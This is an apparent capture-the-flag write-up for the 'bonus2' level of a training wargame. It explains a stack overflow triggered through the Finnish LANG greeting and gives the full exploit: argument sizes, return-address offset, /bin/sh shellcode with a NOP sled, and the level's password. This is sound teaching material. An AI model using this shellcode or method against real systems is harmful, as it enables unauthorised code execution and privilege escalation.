# bonus2

Nothing of note with `ll` and `checksec`.


Functions found using `(gdb) info functions`
|LIBC|user|
|-|-|
|memcmp|main|
|strcat|frame_dummy|
|getenv|greetuser|
|puts||
|strncpy||

`frame_dummy()` does nothing. I don't know why I still write this at this point.

The `main()` sets the *language* variable according to the `LANG` environnment variable. 1 for `fi` (Finnish), 2 when it is `nl` (Dutch), and 0 for any other value or language which will default to English.

`argv[1]` and `argv[2]` are copied into a buffer of a length of **76 bytes**.
If `argv[1]` is shorter than **40 bytes**, then only this argument will be used as the `greeting[64]` later. If it is longer, the first argument's copy will not be null terminated and the whole length will be in the `greeting[64]`.

In the `greetuser()` function, a greeting in either Finnish, Dutchm, or English will be used. Finnish is the longest one with a length of **19 bytes**. When it is used, with a user input of **76 bytes**, it will cause an overflow that can overwrite the return address of the `greeting()` function. By using our overflow pattern finder we can see that we need an to offset **18 bytes** to target the return address.

Therefore, we need to set the lang to Finnish, pass a string of **40 bytes** as the `argv[1]`, an offset of **18 bytes**, and the address to our shellcode as our **payload**.

|argv[1]|argv[2] (padding)|argv[2] shellcode address|
|-|-|-|
|40 bytes|18 bytes|address|

We'll also reuse the shellcode used in `bonus0` and find it's address.

```sh
# outside the VM
./tools/rainfall_toolkit.sh inject bonus2 bonus2/getenv.c
```

```sh
# inside the VM
gcc /tmp/getenv.c -o /tmp/getenv

python -c "print '\x90' *500 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'" > /tmp/shellcode
export SHELLCODE=$(cat /tmp/shellcode)

/tmp/getenv SHELLCODE
0xbffff717 # gives `\x17\xf7\xff\xbf' when converted to injectable little endian
```



```sh
export LANG=fi
./bonus2 $(python -c "print 40* 'A'") $(python -c "print 18* 'a' + '\x17\xf7\xff\xbf'")
$ whoami
bonus3
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

The end is in sight!

```sh
su bonus3
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```
